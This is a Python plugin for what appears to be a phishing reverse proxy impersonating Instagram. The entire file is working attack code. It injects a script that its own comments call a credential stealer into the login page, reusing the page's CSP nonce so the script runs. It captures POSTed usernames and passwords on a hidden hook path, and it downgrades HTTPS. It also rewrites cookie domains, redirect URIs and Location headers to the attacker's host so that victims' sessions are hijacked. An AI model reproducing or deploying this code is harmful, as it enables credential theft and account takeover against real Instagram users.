# What this instagram plugins does:
# Intercept browser XHR requests to redirect them to the actual host
# Create a listener for form data
# Rewrites cookie domain

import io
import json
import pathlib
import re
from dataclasses import dataclass

import zstandard as zstd

# The hostname the client is sending requests to
actual_host: bytes = b""

# Credential stealer script
stealer_script: bytes
stealer_script_location = str(pathlib.Path(__file__).parent / "instagram-inject.js")
print(
    "[plugins/www.instagram.com] Loading Instagram injection script: %s"
    % (stealer_script_location)
)
with open(stealer_script_location, "rb") as injection_file:
    stealer_script = injection_file.read()

# Intercepted data on runtime
intercepted_data: list[bytes] = []


# HTTP Request and response data class defnitions
@dataclass
class HttpRequest:
    method: bytes
    target: bytes
    headers: list[tuple[bytes, bytes]]
    body: bytes


@dataclass
class HttpResponse:
    status_code: int
    headers: list[tuple[bytes, bytes]]
    body: bytes


def modify_request(request: HttpRequest) -> HttpRequest:

    global actual_host, intercepted_data

    # Get route
    log: str = ""  # Log
    if b"/ajax/" not in request.target:
        log += "[plugins/www.instagram.com:modify_request] %s request for %s\n" % (
            request.method.decode(),
            request.target.decode(),
        )  # Log

    # Get username and password
    if request.target == b"/77656274686566742d6c6f6f74" and request.method == b"POST":
        _original_body_length = len(request.body)
        if request.body not in intercepted_data:
            intercepted_data.append(request.body)
            log += (
                "[plugins/www.instagram.com:modify_request] Data intercepted on hook -> %s\n"
                % request.body.decode(errors="ignore")
            )  # Log
        request.target = b"/api/v1"

    if log != "":
        print(log.strip())  # Log

    # Modify headers
    new_headers: list[tuple[bytes, bytes]] = []

    for _hi in range(0, len(request.headers)):
        key, value = request.headers[_hi]

        if key.lower() == b"host":
            if actual_host == b"":
                actual_host = value
            new_headers.append((key, b"www.instagram.com"))
            continue

        if key.lower() == b"origin":
            value = value.replace(actual_host, b"www.instagram.com")
            value = value.replace(b"http:", b"https:")
            new_headers.append((key, value))
            continue

        if key.lower() == b"referer":
            value = value.replace(actual_host, b"www.instagram.com")
            value = value.replace(b"http:", b"https:")
            new_headers.append((key, value))
            continue

        new_headers.append((key, value))

    request.headers = new_headers

    # Do not upgrade to HTTPS
    request.headers = [
        h for h in request.headers if h[0].lower() != b"upgrade-insecure-requests"
    ]

    return request


def modify_response(response: HttpResponse) -> HttpResponse:
    global stealer_script

    log: str = ""

    # If loading the login route inject JS Script
    for key, value in response.headers:
        if key.lower() == b"content-encoding" and value == b"zstd":
            dctx = zstd.ZstdDecompressor()
            reader = dctx.stream_reader(io.BytesIO(response.body))

            cctx = zstd.ZstdCompressor()
            _decoded_body: bytes = reader.read()

            # Extract CSP nonce
            match = re.search(r'nonce="([^"]+)"', _decoded_body.decode(errors="ignore"))
            nonce = b""

            if match:
                nonce = match.group(1).encode().replace(b"'", b"")

            # Log only (no injection logic)
            if b"{actual_host}" in stealer_script:
                stealer_script = stealer_script.replace(
                    b"{actual_host}", b"http://" + actual_host
                )
            injected: bytes = (
                b'<script nonce="' + nonce + b'">' + stealer_script + b"</script>"
            )

            if (
                b"<title>Instagram</title>" in _decoded_body
                and response.status_code == 200
            ):
                _decoded_body = _decoded_body.replace(
                    b"</title>", b"</title>" + injected
                )
                log += "[plugins/www.instagram.com:modify_response] Form data stealer script injected\n"
            if b"redirect_uri" in _decoded_body:
                data = _decoded_body
                match = re.search(
                    r'"redirect_uri":"([^"]+)"', data.decode(errors="ignore")
                )
                if match:
                    url = match.group(1).encode().replace(b'"', b"")
                    modified_url = url.replace(
                        b"https://www.instagram.com", b"http://" + actual_host
                    )
                    _decoded_body = _decoded_body.replace(url, modified_url)
            response.body = cctx.compress(_decoded_body)

    if log != "":
        print(log.strip())

    # Modify headers
    new_headers: list[tuple[bytes, bytes]] = []

    for _hi in range(0, len(response.headers)):
        key, value = response.headers[_hi]

        if key.lower() == b"location":
            value = value.replace(b"www.instagram.com", actual_host)
            value = value.replace(b"https:", b"http:")
            new_headers.append((key, value))
        elif key.lower() == b"set-cookie":
            new_headers.append((key, value.replace(b".instagram.com", actual_host)))
        elif (
            key.lower() == b"access-control-allow-origin"
            or key.lower() == b"allow-origin"
        ):
            new_headers.append((key, b"*"))
        elif key.lower() == b"content-length":
            pass
        else:
            new_headers.append((key, value))

    response.headers = new_headers
    return response
